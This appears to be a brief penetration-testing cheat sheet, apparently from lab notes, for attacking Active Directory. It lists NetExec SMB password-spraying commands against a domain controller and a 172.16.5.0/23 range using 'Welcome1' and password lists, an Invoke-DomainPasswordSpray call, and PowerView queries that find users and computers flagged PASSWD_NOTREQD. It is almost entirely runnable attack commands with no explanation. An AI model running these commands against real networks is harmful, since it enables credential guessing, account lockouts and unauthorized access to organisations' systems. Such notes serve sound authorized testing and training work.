- [ ] Password Spraying
- [ ] PASSWD_NOTREQD Field

Password Spraying!!!
```sh
nxc smb $dc -u users.txt -p Welcome1 --continue-on-success | grep +

nxc smb $dc -u users.txt -p passwords.txt --continue-on-success | grep +

nxc smb --local-auth 172.16.5.0/23 -u administrator -p Welcome1 --continue-on-success | grep +

nxc smb --local-auth 172.16.5.0/23 -u administrator -p passwords.txt --continue-on-success | grep +

Invoke-DomainPasswordSpray -Password lab -Force
```
PASSWD_NOTREQD Field!!!
```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

Get-DomainComputer -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
